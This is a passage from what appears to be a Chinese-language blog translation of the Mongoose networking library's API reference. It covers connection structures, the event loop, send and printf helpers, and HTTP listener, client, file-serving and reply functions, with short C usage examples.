Connected socket, or LWIP data</span><br><span class="line">  unsigned long id;            // Auto-incrementing unique connection ID</span><br><span class="line">  struct mg_iobuf recv;        // Incoming data</span><br><span class="line">  struct mg_iobuf send;        // Outgoing data</span><br><span class="line">  mg_event_handler_t fn;       // User-specified event handler function</span><br><span class="line">  void *fn_data;               // User-specified function parameter</span><br><span class="line">  mg_event_handler_t pfn;      // Protocol-specific handler function</span><br><span class="line">  void *pfn_data;              // Protocol-specific function parameter</span><br><span class="line">  char label[50];              // Arbitrary label</span><br><span class="line">  void *tls;                   // TLS specific data</span><br><span class="line">  unsigned is_listening : 1;   // Listening connection</span><br><span class="line">  unsigned is_client : 1;      // Outbound (client) connection</span><br><span class="line">  unsigned is_accepted : 1;    // Accepted (server) connection</span><br><span class="line">  unsigned is_resolving : 1;   // Non-blocking DNS resolve is in progress</span><br><span class="line">  unsigned is_connecting : 1;  // Non-blocking connect is in progress</span><br><span class="line">  unsigned is_tls : 1;         // TLS-enabled connection</span><br><span class="line">  unsigned is_tls_hs : 1;      // TLS handshake is in progress</span><br><span class="line">  unsigned is_udp : 1;         // UDP connection</span><br><span class="line">  unsigned is_websocket : 1;   // WebSocket connection</span><br><span class="line">  unsigned is_hexdumping : 1;  // Hexdump in/out traffic</span><br><span class="line">  unsigned is_draining : 1;    // Send remaining data, then close and free</span><br><span class="line">  unsigned is_closing : 1;     // Close and free the connection immediately</span><br><span class="line">  unsigned is_full : 1;        // Stop reads, until cleared</span><br><span class="line">  unsigned is_resp : 1;        // Response is still being generated</span><br><span class="line">  unsigned is_readable : 1;    // Connection is ready to read</span><br><span class="line">  unsigned is_writable : 1;    // Connection is ready to write</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>它是一个连接：可能是一个监听连接，或者是一个已接收连接，或者是一个出站连接</li>
</ul>
<h3 id="1-2-核心API调用"><a href="#1-2-核心API调用" class="headerlink" title="1.2 核心API调用"></a>1.2 核心API调用</h3><h4 id="mg-mgr-init"><a href="#mg-mgr-init" class="headerlink" title="mg_mgr_init()"></a><code>mg_mgr_init()</code></h4><ul>
<li><code>void mg_mgr_init(struct mg_mgr *mgr);</code></li>
<li>初始化事件管理器结构体变量，它所做的工作：<ul>
<li>将活动连接的列表设置为null</li>
<li>设置IPv4和IPv6的默认DNS服务器</li>
<li>设置默认DNS查找超时</li>
</ul>
</li>
<li>参数<ul>
<li><code>mgr</code>  –  需要初始化的<code>mg_mgr</code>结构体指针</li>
</ul>
</li>
<li>返回值：无</li>
<li>示例<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">struct mg_mgr mgr;</span><br><span class="line">mg_mgr_init(&amp;mgr);</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="mg-mgr-poll"><a href="#mg-mgr-poll" class="headerlink" title="mg_mgr_poll()"></a><code>mg_mgr_poll()</code></h4><ul>
<li><code>void mg_mgr_poll(struct mg_mgr *mgr, int ms);</code></li>
<li>在所有连接中迭代，接受新的连接，发送和接收数据，关闭连接并调用事件处理程序的功能，以适用于各自事件。</li>
<li>执行一次池迭代(poll iteration)。对在<code>mgr-&gt;conns</code>列表中的每一个连接进行如下操作<ul>
<li>查看是否有传入数据。如果有，将数据读入到<code>c-&gt;recv</code>缓冲区，并发出一个<code>MG_EV_READ</code>事件</li>
<li>查看<code>c-&gt;send</code>缓冲区是否有数据。如果有，写入数据，并发送<code>MG_EV_WRITE</code>事件</li>
<li>如果一个连接处于监听状态，或已接收一个进入的连接状态，发送一个<code>MG_EV_ACCEPT</code>事件</li>
<li>发送<code>MG_EV_POLL</code>事件</li>
</ul>
</li>
<li>参数<ul>
<li><code>mgr</code>  –  使用的事件管理结构体</li>
<li><code>ms</code>   –  超时时间，单位为毫秒</li>
</ul>
</li>
<li>返回值：无</li>
<li>示例<ul>
<li><code>while (running == true) mg_mgr_poll(&amp;mgr, 1000 /*1 second*/);</code></li>
</ul>
</li>
</ul>
<h4 id="mg-mgr-free"><a href="#mg-mgr-free" class="headerlink" title="mg_mgr_free()"></a><code>mg_mgr_free()</code></h4><ul>
<li><code>void mg_mgr_free(struct mg_mgr *mgr);</code></li>
<li>关闭所有连接，释放所有资源</li>
<li>参数：<ul>
<li><code>mgr</code>  –  需要被清除的事件管理结构体</li>
</ul>
</li>
<li>返回值：无</li>
<li>示例<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">struct mg_mgr mgr;</span><br><span class="line">mg_mgr_init(&amp;mgr);</span><br><span class="line">while (running == true) mg_mgr_poll(&amp;mgr, 1000);   // Event loop</span><br><span class="line">mg_mgr_free(&amp;mgr);</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="mg-listen"><a href="#mg-listen" class="headerlink" title="mg_listen()"></a><code>mg_listen()</code></h4><ul>
<li><code>struct mg_connection *mg_listen(struct mg_mgr *mgr, const char *url, mg_event_handler_t fn, void *fn_data);</code></li>
<li>创建一个监听连接，并将这个连接追加到<code>mgr-&gt;conns</code>连接列表中</li>
<li>参数：<ul>
<li><code>mgr</code>  –  使用的事件管理结构体</li>
<li><code>url</code>  –  URL。指定监听的本地IP地址和端口，例如：<code>tcp://127.0.0.1:1234</code>或<code>udp://0.0.0.0:9000</code></li>
<li><code>fn</code>   –  事件处理函数</li>
<li><code>fn_data</code>  –  一个任意指针，当事件处理函数被调用时，它会被作为<code>fn_data</code>传递。这个指针作为<code>c-&gt;fn_data</code>存储在连接结构体中</li>
</ul>
</li>
<li>返回值：返回创建的连接 或 NULL作为错误</li>
<li>示例<ul>
<li><code>struct mg_connection *c = mg_listen(&amp;mgr, &quot;tcp://127.0.0.1:8080&quot;, fn, NULL);</code></li>
</ul>
</li>
</ul>
<h4 id="mg-connect"><a href="#mg-connect" class="headerlink" title="mg_connect()"></a><code>mg_connect()</code></h4><ul>
<li><code>struct mg_connection *mg_connect(struct mg_mgr *mgr, const char *url, mg_event_handler_t fn, void *fn_data);</code></li>
<li>创建一个出站连接，并将这个连接追加到<code>mgr-&gt;conns</code>队列中</li>
<li>参数：<ul>
<li><code>mgr</code>  –  使用的事件管理结构体</li>
<li><code>url</code>  –  URL，指定需要连接的远程IP地址和端口。例如：<code>http://a.com</code></li>
<li><code>fn</code>   –  一个事件处理函数</li>
<li><code>fn_data</code>  –  一个任意指针，当事件处理函数被调用时，它会被作为<code>fn_data</code>传递。这个指针作为<code>c-&gt;fn_data</code>存储在连接结构体中</li>
</ul>
</li>
<li>返回值：返回创建的连接 或 NULL作为错误</li>
<li>注意：<ul>
<li>这个函数不会连接对端，它只会分配需要的资源和启动连接进程。</li>
<li>一旦对端真正连接了，会将<code>MG_EV_CONNECT</code>事件发送到连接事件处理</li>
</ul>
</li>
<li>示例<ul>
<li><code>struct mg_connection *c = mg_connect(&amp;mgr, &quot;http://example.org&quot;, fn, NULL);</code></li>
</ul>
</li>
</ul>
<h4 id="mg-send"><a href="#mg-send" class="headerlink" title="mg_send()"></a><code>mg_send()</code></h4><ul>
<li><code>int mg_send(struct mg_connection *c, const void *data, size_t size);</code></li>
<li>将大小为<code>size</code>的数据追加到<code>c-&gt;send</code>缓冲区。返回追加的字节数</li>
<li>注意：<ul>
<li>这个函数不会将数据推送到网络。它仅仅是将数据追加到输出缓冲区。</li>
<li>只有当<code>mg_mgr_poll()</code>被调用时，才会将数据发送出去。</li>
<li>如果<code>mg_send()</code>被多次调用，则输出缓冲区会增长</li>
</ul>
</li>
<li>参数：<ul>
<li><code>c</code>  –  一个连接指针</li>
<li><code>data</code>  –  一个指向需要增加到输出缓冲区的数据指针</li>
<li><code>size</code>  –  数据大小</li>
</ul>
</li>
<li>返回值：如果数据成功追加，则返回true；否则返回false</li>
<li>示例<ul>
<li><code>mg_send(c, &quot;hi&quot;, 2);  // Append string &quot;hi&quot; to the output buffer</code></li>
</ul>
</li>
</ul>
<h4 id="mg-printf-mg-vprintf"><a href="#mg-printf-mg-vprintf" class="headerlink" title="mg_printf(), mg_vprintf()"></a><code>mg_printf(), mg_vprintf()</code></h4><ul>
<li><code>int mg_printf(struct mg_connection *, const char *fmt, ...);</code></li>
<li><code>int mg_vprintf(struct mg_connection *, const char *fmt, va_list *ap);</code></li>
<li>与<code>mg_send()</code>相同，但是使用<code>printf()</code>语义格式化数据。返回追加到输出缓冲区的字节数。有关支持格式规范列表，参见<code>mg_snprintf</code></li>
<li>参数：<ul>
<li><code>c</code>  –  一个连接指针</li>
<li><code>fmt</code>  –  <code>printf()</code>语义中的格式字符串</li>
</ul>
</li>
<li>返回值：返回追加到输出缓冲区的字节数</li>
<li>示例<ul>
<li><code>mg_printf(c, &quot;Hello, %s!&quot;, &quot;world&quot;); // Add &quot;Hello, world!&quot; to output buffer</code></li>
</ul>
</li>
</ul>
<h4 id="mg-wrapfd"><a href="#mg-wrapfd" class="headerlink" title="mg_wrapfd()"></a><code>mg_wrapfd()</code></h4><ul>
<li><code>struct mg_connection *mg_wrapfd(struct mg_mgr *mgr, int fd, mg_event_handler_t fn, void *fn_data);</code></li>
<li>将给定的文件描述符<code>fd</code>包装到连接中，然后将该连接添加到事件管理器中。这个<code>fd</code>文件描述符必须支持<code>send(), recv(), select()</code>系统调用，而且是非阻塞的。Mongoose将把它当做TCP套接字使用。<code>c-&gt;rem</code>和<code>c-&gt;loc</code>地址将会变为空的</li>
<li>参数：<ul>
<li><code>fd</code>  –  需要包装的文件描述符</li>
<li><code>mgr</code> –  一个事件管理结构体</li>
<li><code>fn</code>  –  一个指向事件处理函数的指针</li>
<li><code>ud</code>  –  一个用户数据指针。它将被当做<code>fn_data</code>参数传递给<code>fn</code></li>
</ul>
</li>
<li>返回值：返回创建的连接 或者 NULL作为错误</li>
</ul>
<h4 id="mg-mkpipe"><a href="#mg-mkpipe" class="headerlink" title="mg_mkpipe()"></a><code>mg_mkpipe()</code></h4><ul>
<li><code>int mg_mkpipe(struct mg_mgr *mgr, mg_event_handler_t fn, void *fn_data, bool udp);</code></li>
<li>创建两个互相连接的套接字，用于线程间通信。其中一个套接字被包装到一个Mongoose连接，并被添加到事件管理结构体中。另一个套接字将会被返回，且它应该被传递给工作线程。当一个工作线程使用<code>send()</code>发送任何数据到这个套接字，都将唤醒<code>mgr</code>和<code>fn</code>事件处理函数接收一个<code>MG_EV_READ</code>事件。另外，<code>fn</code>向工作线程发送的任何数据，都被由工作线程使用<code>recv()</code>接收。</li>
<li>参数：<ul>
<li><code>mgr</code>  –  一个事件管理结构体</li>
<li><code>fn</code>   –  一个指向事件处理函数的指针</li>
<li><code>fn_data</code>  –  一个指向用户数据的指针。它将会被当做<code>fn_data</code>参数传递给<code>fn</code></li>
<li><code>udp</code>  –  告知创建一个UDP，还是创建一个TCP socketpair</li>
</ul>
</li>
<li>返回值：成功，返回创建的套接字；失败，返回-1</li>
<li>使用案例参见<code>examples/multi-threaded</code></li>
</ul>
<h4 id="mg-hello"><a href="#mg-hello" class="headerlink" title="mg_hello()"></a><code>mg_hello()</code></h4><ul>
<li><code>void mg_hello(const char *url);</code></li>
<li>便利功能，在给定的监听URL上启动一个简单的Web服务器。这个函数只有在接收到一个<code>/quit</code>请求才会返回。服务器处理以下URI<ul>
<li><code>/quit</code>  –  退出服务，且退出函数</li>
<li><code>/debug</code> –  设置调试级别，作为POST负载，<code>&#123;&quot;level&quot; : 3&#125;</code>是有效的</li>
<li>对其他所有的URI，都将返回一个<code>hi</code>作为响应</li>
</ul>
</li>
<li>参数：<ul>
<li><code>url</code>  –  一个监听的URL，例如：<code>http://0.0.0.0:8000</code></li>
</ul>
</li>
</ul>
<h3 id="1-3-HTTP-API"><a href="#1-3-HTTP-API" class="headerlink" title="1.3 HTTP API"></a>1.3 HTTP API</h3><h4 id="struct-mg-http-header"><a href="#struct-mg-http-header" class="headerlink" title="struct mg_http_header"></a><code>struct mg_http_header</code></h4><ul>
<li>声明：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">struct mg_http_header &#123;</span><br><span class="line">  struct mg_str name;   // Header name</span><br><span class="line">  struct mg_str value;  // Header value</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li>
<li>结构代表HTTP标头，像<code>Content-Type: text/html</code>。<code>Content-Type</code> 是一个 Header name，<code>text/html/</code>是一个 Header value</li>
</ul>
<h4 id="struct-mg-http-message"><a href="#struct-mg-http-message" class="headerlink" title="struct mg_http_message"></a><code>struct mg_http_message</code></h4><ul>
<li>声明<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">struct mg_http_message &#123;</span><br><span class="line">  struct mg_str method, uri, query, proto;             // Request/response line</span><br><span class="line">  struct mg_http_header headers[MG_MAX_HTTP_HEADERS];  // Headers</span><br><span class="line">  struct mg_str body;                                  // Body</span><br><span class="line">  struct mg_str message;                               // Request line + headers + body</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li>
<li>结构代表HTTP消息。</li>
</ul>
<h4 id="mg-http-listen"><a href="#mg-http-listen" class="headerlink" title="mg_http_listen()"></a><code>mg_http_listen()</code></h4><ul>
<li><code>struct mg_connection *mg_http_listen(struct mg_mgr *mgr, const char *url, mg_event_handler_t fn, void *fn_data);</code></li>
<li>创建HTTP侦听器。</li>
<li>参数：<ul>
<li><code>mgr</code>  –  一个事件管理结构体</li>
<li><code>url</code>  –  一个URL，指定监听的本地IP地址和端口。例如：<code>http://0.0.0.0:8000</code></li>
<li><code>fn</code>   –  一个事件处理函数</li>
<li><code>fn_data</code>  –  一个任意指针，当事件处理函数被调用时，它会被作为<code>fn_data</code>传递。这个指针作为<code>c-&gt;fn_data</code>存储在连接结构体中</li>
</ul>
</li>
<li>返回值：返回一个指向创建的连接指针 或者 返回NULL表示错误</li>
<li>示例<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">struct mg_connection *c = mg_http_listen(&amp;mgr, &quot;0.0.0.0:8000&quot;, fn, arg);</span><br><span class="line">if (c == NULL) fatal_error(&quot;Cannot create listener&quot;);</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="mg-http-connect"><a href="#mg-http-connect" class="headerlink" title="mg_http_connect()"></a><code>mg_http_connect()</code></h4><ul>
<li><code>struct mg_connection *mg_http_connect(struct mg_mgr *, const char *url, mg_event_handler_t fn, void *fn_data);</code></li>
<li>创建HTTP客户端连接。这个函数不能连接到对端，它仅仅分配需要的资源和启动连接进程。当对端真正连接好了，会向连接事件处理函数发送一个<code>MG_EV_CONNECT</code>事件</li>
<li>参数：<ul>
<li><code>mgr</code>  –  事件管理结构体</li>
<li><code>url</code>  –  URL，指定远程URL。例如:<code>http://google.com</code></li>
<li><code>fn</code>   –  事件处理函数</li>
<li><code>fn_data</code>  –  一个任意指针，当事件处理函数被调用时，它会被作为<code>fn_data</code>传递。这个指针作为<code>c-&gt;fn_data</code>存储在连接结构体中</li>
</ul>
</li>
<li>返回值： 返回一个指向创建的连接的指针 或者 返回NULL表示错误</li>
<li>示例<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">struct mg_connection *c = mg_http_connect(&amp;mgr, &quot;http://google.com&quot;, fn, NULL);</span><br><span class="line">if (c == NULL) fatal_error(&quot;Cannot create connection&quot;);</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="mg-http-status"><a href="#mg-http-status" class="headerlink" title="mg_http_status()"></a><code>mg_http_status()</code></h4><ul>
<li><code>int mg_http_status(const struct mg_http_message *hm);</code></li>
<li>获取HTTP响应的状态代码。</li>
<li>参数：<ul>
<li><code>hm</code>  –  需要解析的HTTP响应</li>
</ul>
</li>
<li>返回值：返回状态码。例如：200表示成功</li>
</ul>
<h4 id="mg-http-get-request-len"><a href="#mg-http-get-request-len" class="headerlink" title="mg_http_get_request_len()"></a><code>mg_http_get_request_len()</code></h4><ul>
<li><code>int mg_http_get_request_len(const unsigned char *buf, size_t buf_len);</code></li>
<li>获取请求的长度。请求的长度是直到HTTP头结束的字节数。它不包括HTTP请求体的长度</li>
<li>参数：<ul>
<li><code>buf</code>  –  指向存放请求数据的缓冲区的指针</li>
<li><code>buf_len</code>  –  缓冲区大小</li>
</ul>
</li>
<li>返回值： <ul>
<li>-1  –  错误</li>
<li>0   –  消息不完整</li>
<li>请求的长度</li>
</ul>
</li>
<li>示例<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">const char *buf = &quot;GET /test \n\nGET /foo\n\n&quot;;</span><br><span class="line">int req_len = mg_http_get_request_len(buf, strlen(buf));  // req_len == 12</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="mg-http-parse"><a href="#mg-http-parse" class="headerlink" title="mg_http_parse()"></a><code>mg_http_parse()</code></h4><ul>
<li><code>int mg_http_parse(const char *s, size_t len, struct mg_http_message *hm);</code></li>
<li>解析请求报文字符串，并存入到<code>mg_http_message</code>结构体中</li>
<li>参数：<ul>
<li><code>s</code>    –  一个请求字符串</li>
<li><code>len</code>  –  请求字符串的长度</li>
<li><code>hm</code>   –  存储解析请求报文结果的结构体指针</li>
</ul>
</li>
<li>返回值：返回请求报文的长度</li>
<li>示例<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">struct mg_http_message hm;</span><br><span class="line">const char *buf = &quot;GET / HTTP/1.0\n\n&quot;;</span><br><span class="line">if (mg_http_parse(buf, strlen(buf), &amp;hm) &gt; 0) &#123; /* success */ &#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="mg-http-printf-chunk"><a href="#mg-http-printf-chunk" class="headerlink" title="mg_http_printf_chunk()"></a><code>mg_http_printf_chunk()</code></h4><ul>
<li><code>void mg_http_printf_chunk(struct mg_connection *c, const char *fmt, ...);</code></li>
<li>使用<code>printf()</code>语义，写一个块编码的块数据。(Write a chunk of data in chunked encoding format, using printf() semantic)</li>
<li>参数：<ul>
<li><code>c</code>    –  一个连接指针</li>
<li><code>fmt</code>  –  以<code>printf()</code>语义的字符串</li>
</ul>
</li>
<li>返回值：无</li>
<li>示例<ul>
<li><code>mg_http_printf_chunk(c, &quot;Hello, %s!&quot;, &quot;world&quot;);</code></li>
</ul>
</li>
</ul>
<h4 id="mg-http-write-chunk"><a href="#mg-http-write-chunk" class="headerlink" title="mg_http_write_chunk()"></a><code>mg_http_write_chunk()</code></h4><ul>
<li><code>void mg_http_write_chunk(struct mg_connection *c, const char *buf, size_t len);</code></li>
<li>写入一个块编码格式的块数据(Write a chunk of data in chunked encoding format.)</li>
<li>参数：<ul>
<li><code>c</code>   –  一个连接指针</li>
<li><code>buf</code> –  需要写入的数据</li>
<li><code>len</code> –  写入数据的长度</li>
</ul>
</li>
<li>返回值：无</li>
<li>示例：<ul>
<li><code>mg_http_write_chunk(c, &quot;hi&quot;, 2);</code></li>
</ul>
</li>
</ul>
<h4 id="mg-http-delete-chunk"><a href="#mg-http-delete-chunk" class="headerlink" title="mg_http_delete_chunk()"></a><code>mg_http_delete_chunk()</code></h4><ul>
<li><code>void mg_http_delete_chunk(struct mg_connection *c, struct mg_http_message *hm);</code></li>
<li>从输入缓冲区中删除指定的块(chunk)</li>
<li>参数：<ul>
<li><code>c</code>  –  连接指针</li>
<li><code>hm</code> –  需要删除的块(chunk)</li>
</ul>
</li>
<li>返回值：无</li>
<li>示例：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// Mongoose events handler</span><br><span class="line">void fn(struct mg_connection *c, int ev, void *ev_data, void *fn_data) &#123;</span><br><span class="line">  if (ev == MG_EV_HTTP_CHUNK) &#123;</span><br><span class="line">    struct mg_http_message *hm = (struct mg_http_message *) ev_data;</span><br><span class="line">    mg_http_delete_chunk(c, hm); // Remove received chunk</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="struct-mg-http-serve-opts"><a href="#struct-mg-http-serve-opts" class="headerlink" title="struct mg_http_serve_opts"></a><code>struct mg_http_serve_opts</code></h4><ul>
<li>声明：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">struct mg_http_serve_opts &#123;</span><br><span class="line">  const char *root_dir;       // Web root directory, must be non-NULL</span><br><span class="line">  const char *ssi_pattern;    // SSI file name pattern, e.g. #.shtml</span><br><span class="line">  const char *extra_headers;  // Extra HTTP headers to add in responses</span><br><span class="line">  const char *mime_types;     // Extra mime types, ext1=type1,ext2=type2,..</span><br><span class="line">  const char *page404;        // Path to the 404 page, or NULL by default</span><br><span class="line">  struct mg_fs *fs;           // Filesystem implementation. Use NULL for POSIX</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li>
<li>传递给<code>mg_http_serve_dir()</code>和<code>mg_http_serve_file()</code>的结构，该结构驱动了这两个函数的行为</li>
</ul>
<h4 id="mg-http-serve-dir"><a href="#mg-http-serve-dir" class="headerlink" title="mg_http_serve_dir()"></a><code>mg_http_serve_dir()</code></h4><ul>
<li><code>void mg_http_serve_dir(struct mg_connection *c, struct mg_http_message *hm, const struct mg_http_serve_opts *opts);</code></li>
<li>根据给定选项服务多个静态文件。文件也可以被压缩,包括目录索引。所有压缩文件都必须以.gz结尾，并且不得在没有扩展名的情况下存在具有相同名称的文件，否则将优先考虑</li>
<li>注意：<ul>
<li>为了启动SSI，需要设置<code>-DMSG_ENABLE_SSI=1</code>构件标志</li>
<li>在<code>root_dir</code>中为了避免双点<code>..</code>，如果需要引用高级目录，则需要使用绝对路径</li>
</ul>
</li>
<li>参数：<ul>
<li><code>c</code>     –  使用的连接</li>
<li><code>hm</code>    –  应该被服务的HTTP消息</li>
<li><code>opts</code>  –  服务选项。请注意，<code>opts.root_dir</code>可以选择接受额外的逗号分隔<code>uri=path</code></li>
</ul>
</li>
<li>返回值：无</li>
<li>示例：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// Mongoose events handler</span><br><span class="line">void fn(struct mg_connection *c, int ev, void *ev_data, void *fn_data) &#123;</span><br><span class="line">  if (ev == MG_EV_HTTP_MSG) &#123;</span><br><span class="line">    struct mg_http_message *hm = (struct mg_http_message *) ev_data;</span><br><span class="line">    struct mg_http_serve_opts opts;</span><br><span class="line">    memset(&amp;opts, 0, sizeof(opts));</span><br><span class="line">    opts.root_dir = &quot;/var/www,/conf=/etc&quot;;  // Serve /var/www. URIs starting with /conf are served from /etc</span><br><span class="line">    mg_http_serve_dir(c, hm, &amp;opts);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="mg-http-serve-file"><a href="#mg-http-serve-file" class="headerlink" title="mg_http_serve_file()"></a><code>mg_http_serve_file()</code></h4><ul>
<li><code>void mg_http_serve_file(struct mg_connection *c, struct mg_http_message *hm, const char *path, struct mg_http_serve_opts *opts);</code></li>
<li>服务一个静态文件。如果不存在带有路径中指定的文件名的文件，则Mongoose尝试附加<code>.gz</code>；如果存在这样的文件，它将使用<code>Content-Encoding: gzip</code> header 去服务</li>
<li>注意：<ul>
<li><code>opts-&gt;root_dir</code>设置被这个函数忽略</li>
<li><code>opts-&gt;extra_headers</code> 必须以<code>\r\n</code>结束</li>
</ul>
</li>
<li>参数：<ul>
<li><code>c</code>     –  使用的连接</li>
<li><code>hm</code>    –  需要服务的HTTP消息</li>
<li><code>path</code>  –  需要服务的文件路径</li>
<li><code>opts</code>  –  服务选项</li>
</ul>
</li>
<li>返回值：无</li>
<li>示例：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// Mongoose events handler</span><br><span class="line">void fn(struct mg_connection *c, int ev, void *ev_data, void *fn_data) &#123;</span><br><span class="line">  if (ev == MG_EV_HTTP_MSG) &#123;</span><br><span class="line">    struct mg_http_message *hm = (struct mg_http_message *) ev_data;</span><br><span class="line">    struct mg_http_serve_opts opts = &#123;</span><br><span class="line">      .mime_types = &quot;png=image/png&quot;,</span><br><span class="line">      .extra_headers = &quot;AA: bb\r\nCC: dd\r\n&quot;</span><br><span class="line">    &#125;;</span><br><span class="line">    mg_http_serve_file(c, hm, &quot;a.png&quot;, &amp;opts);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="mg-http-reply"><a href="#mg-http-reply" class="headerlink" title="mg_http_reply()"></a><code>mg_http_reply()</code></h4><ul>
<li><code>void mg_http_reply(struct mg_connection *c, int status_code, const char *headers, const char *body_fmt, ...);</code></li>
<li>通过使用<code>printf()</code>语义发送简单的HTTP响应。这个函数根据<code>body_fmt</code>格式化响应体(response body)，然后自动追加到一个正确的<code>Content-Length</code>头(header)。额外的<code>headers</code>需要通过<code>headers</code>参数传递</li>
<li>参数：<ul>
<li><code>c</code>     –  使用的连接</li>
<li><code>status_code</code>  –  一个HTTP响应状态码</li>
<li><code>headers</code>      –  额外的headers，默认为NULL，如果不是空，则必须以<code>\r\n</code>结尾</li>
<li><code>fmt</code>    –  使用<code>printf</code>语义，需要格式化成HTTP body的字符串</li>
</ul>
</li>
<li>返回值：无</li>
<li>示例：<ul>
<li>发送一个简单的JSON响应：<ul>
<li><code>mg_http_reply(c, 200, &quot;Content-Type: application/json\r\n&quot;, &quot;&#123;\&quot;result\&quot;: %d&#125;&quot;, 123);</code></li>
</ul>
</li>
<li>发送一个302重定向：<ul>
<li><code>mg_http_reply(c, 302, &quot;Location: /\r\n&quot;, &quot;&quot;);</code></li>
</ul>
</li>
<li>发送一个错误<ul>
<li><code>mg_http_reply(c, 403, &quot;&quot;, &quot;%s&quot;, &quot;Not Authorized\n&quot;);</code></li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="mg-http-get-header"><a href="#mg-http-get-header" class="headerlink" title="mg_http_get_header()"></a><code>mg_http_get_header()</code></h4><ul>
<li><code>struct mg_str *mg_http_get_header(struct mg_http_message *hm, const char *name);</code></li>
<li>获取HTTP header值</li>
<li>参数：<ul>
<li><code>hm</code>    –  需要寻找 header 的HTTP消息</li>
<li><code>name</code>  –  Header name</li>
</ul>
</li>
<li>返回值：HTTP header 值 或 NULL表示没有找到</li>
<li>示例：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">// Mongoose event handler</span><br><span class="line">void fn(struct mg_connection *c, int ev, void *ev_data, void *fn_data) &#123;</span><br><span class="line">  if (ev == MG_EV_HTTP_MSG) &#123;</span><br><span class="line">    struct mg_http_message *hm = (struct mg_http_message *) ev_data;</span><br><span class="line">    struct mg_str *s = mg_http_get_header(hm, &quot;X-Extra-Header&quot;);</span><br><span class="line">    if (s != NULL) &#123;</span><br><span class="line">      mg_http_reply(c, 200, &quot;&quot;, &quot;Holly molly! Header value: %.*s&quot;, (int) s-&gt;len, s-&gt;ptr);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      mg_http_reply(c, 200, &quot;&quot;, &quot;Oh no, header is not set...&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="mg-http-get-header-var"><a href="#mg-http-get-header-var" class="headerlink" title="mg_http_get_header_var()"></a><code>mg_http_get_header_var()</code></h4><ul>
<li><code>struct mg_str mg_http_get_header_var(struct mg_str s, struct mg_str v);</code></li>
<li>解析具有表格<code>name1=value1; name=value2;...</code>的HTTP header，并获取一个给定的变量</li>
<li>参数：<ul>
<li><code>s</code>  –  HTTP header</li>
<li><code>name</code>  –  变量名字的名字</li>
</ul>
</li>
<li>返回值：一个请求的变量 或 一个空的字符串</li>
